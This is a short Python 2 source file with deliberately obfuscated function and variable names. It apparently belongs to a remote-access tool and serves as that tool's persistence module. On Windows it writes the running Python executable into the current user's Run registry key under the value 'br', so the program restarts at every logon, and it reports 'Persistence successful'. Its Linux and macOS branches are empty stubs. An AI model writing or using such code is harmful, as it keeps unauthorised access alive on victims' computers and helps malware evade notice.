# -*- coding: utf-8 -*-
import sys
def uLqFmXkasgXTkaQupXWAqUwxYCcVyBum():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    kDfpcjfwDTNWDwSqnPbVAkiGCIuaXNCd = r'Software\Microsoft\Windows\CurrentVersion\Run'
    ZEbhezZAHFkxZntBfmTYnMrdNtJqVHLL = sys.executable
    try:
        pqpdEVxdxKcHQlHRibfTqbPoQGbvdHoS = _winreg.OpenKey(HKCU, kDfpcjfwDTNWDwSqnPbVAkiGCIuaXNCd, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(pqpdEVxdxKcHQlHRibfTqbPoQGbvdHoS, 'br', 0, _winreg.REG_SZ, ZEbhezZAHFkxZntBfmTYnMrdNtJqVHLL)
        _winreg.CloseKey(pqpdEVxdxKcHQlHRibfTqbPoQGbvdHoS)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def DGKvigBclSdufeghycpSAhmRMsMeLHFi():
    return False, 'nothing here yet'
def JsPlknSqGIwjoiDWtrcIkWPaymgJFFSw():
    return False, 'nothing here yet'
def WSqSOAnShQHSvdedPYYsODeGEBJMNifM(plat_type):
    if plat_type.startswith('win'):
        success, BVoidgHpADqeloiQYwCvtvJrRsEhZJll = uLqFmXkasgXTkaQupXWAqUwxYCcVyBum()
    elif plat_type.startswith('linux'):
        success, BVoidgHpADqeloiQYwCvtvJrRsEhZJll = DGKvigBclSdufeghycpSAhmRMsMeLHFi()
    elif plat_type.startswith('darwin'):
        success, BVoidgHpADqeloiQYwCvtvJrRsEhZJll = JsPlknSqGIwjoiDWtrcIkWPaymgJFFSw()
    else:
        return 'Error, platform unsupported.'
    if success:
        DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = 'Persistence successful, {}.'.format(BVoidgHpADqeloiQYwCvtvJrRsEhZJll)
    else:
        DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = 'Persistence unsuccessful, {}.'.format(BVoidgHpADqeloiQYwCvtvJrRsEhZJll)
    return DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV
